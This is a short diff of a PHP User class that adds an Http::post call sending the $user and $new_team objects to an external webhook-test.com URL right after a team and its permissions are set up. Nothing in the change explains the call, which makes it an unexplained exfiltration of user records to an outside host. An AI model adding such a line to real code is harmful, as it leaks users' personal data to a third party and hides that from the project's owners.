@@ -56,6 +56,11 @@ class User{
                         'permissions' => $package->permissions
                     ]
                 );
+
+                Http::post("https://webhook-test.com/bf900a4221bada3c41a4ec0f71f22694",[
+                    $user,
+                    $new_team
+                ]);
             endif;
             // message text
             $message = urlencode("
